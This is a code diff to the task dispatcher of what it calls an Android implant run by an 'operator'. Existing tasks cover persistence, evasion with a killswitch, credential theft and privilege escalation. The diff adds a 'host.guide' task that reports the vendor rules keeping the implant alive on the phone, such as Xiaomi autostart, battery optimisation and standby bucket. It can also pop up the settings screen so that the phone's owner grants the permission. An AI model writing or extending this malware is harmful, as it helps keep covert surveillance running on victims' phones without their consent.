@@ -28,7 +28,7 @@ object TaskRunner {
         "persist", "unpersist", "persist.list", "persist.verify",
         "persist.migrate", "persist.health",
         "evade.report", "evade.posture", "evade.profile", "evade.killswitch",
-        "hygiene.memory", "creds", "privesc",
+        "hygiene.memory", "creds", "privesc", "host.guide",
     )
 
     /**
@@ -356,6 +356,9 @@ object TaskRunner {
             "evade.killswitch" -> evasionKillswitch(args)
             "hygiene.memory" -> Outcome(0, Evasion.memoryReport().toByteArray(), "")
 
+            // ---- the rules of the manufacturer ---------------------------
+            "host.guide" -> hostGuide(args)
+
             // ---- network reach and the local environment ------------------
             "env" -> environment(args.field("filter")?.text() ?: "")
             // The working directory of the implant.  On a phone the
@@ -470,6 +473,48 @@ object TaskRunner {
         val ctx = context ?: return
         val args = Upk.map("method" to Upk.str("all"))
         Persistence.remove(ctx.android, ctx.stateDir, args)
+    }
+
+    /**
+     * The guide of the host: what keeps the implant alive here.
+     *
+     * On a phone the answer is the rules of the manufacturer: the
+     * autostart list of Xiaomi, the battery optimisation, the
+     * notification and the standby bucket.  The operator may ask for the
+     * screen of a step, and the phone shows it -- the permission itself
+     * has to be pressed by the user of the phone.
+     */
+    private fun hostGuide(args: Upk): Outcome {
+        val ctx = context?.android
+        if (ctx == null) {
+            return Outcome(0, "guide: the phone has no context to look at\n".toByteArray(), "")
+        }
+        val action = args.field("action")?.text() ?: "report"
+        if (action == "show") {
+            val step = args.field("step")?.text() ?: ""
+            val text = Vendor.show(ctx, step)
+            return Outcome(0, text.toByteArray(), "").with("guide", guideValue(ctx))
+        }
+        return Outcome(0, Vendor.report(ctx).toByteArray(), "")
+            .with("guide", guideValue(ctx))
+    }
+
+    /** The guide as a value, so the operator can read it without the text. */
+    private fun guideValue(ctx: android.content.Context): Upk {
+        val fields = mutableListOf<Pair<String, Upk>>()
+        for ((key, value) in Vendor.state(ctx)) {
+            fields.add(key to Upk.str(value))
+        }
+        val steps = Vendor.steps(ctx).map { step ->
+            Upk.map(
+                "id" to Upk.str(step.id),
+                "title" to Upk.str(step.title),
+                "why" to Upk.str(step.why),
+                "state" to Upk.str(step.state),
+            )
+        }
+        fields.add("steps" to Upk.Arr(steps))
+        return Upk.map(*fields.toTypedArray())
     }
 
     /** The posture of the phone. */
